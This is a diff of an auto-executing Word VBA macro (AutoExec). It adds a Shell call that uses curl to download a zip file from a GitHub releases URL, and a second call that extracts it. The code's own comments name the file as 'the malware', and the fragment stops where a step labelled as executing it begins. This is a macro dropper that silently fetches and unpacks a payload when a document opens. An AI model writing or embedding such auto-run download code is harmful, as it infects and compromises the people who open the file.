@@ -9,7 +9,11 @@ Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExec"
     
     ' download the exe file from releases page
     Dim RetVal
-    RetVal = Shell("curl -LJO https://github.com/blj-magnar/", 1)
+    RetVal = Shell("curl -LJO https://github.com/magnar-blj/magnar/releases/download/v3.00/magnar.zip", 1)
+    
+    ' Unzip the malware
+    Dim Unzip
+    Unzip = Shell("tar -zxf magnar.zip", 1)
     
     ' execute the malware
     Dim Exec
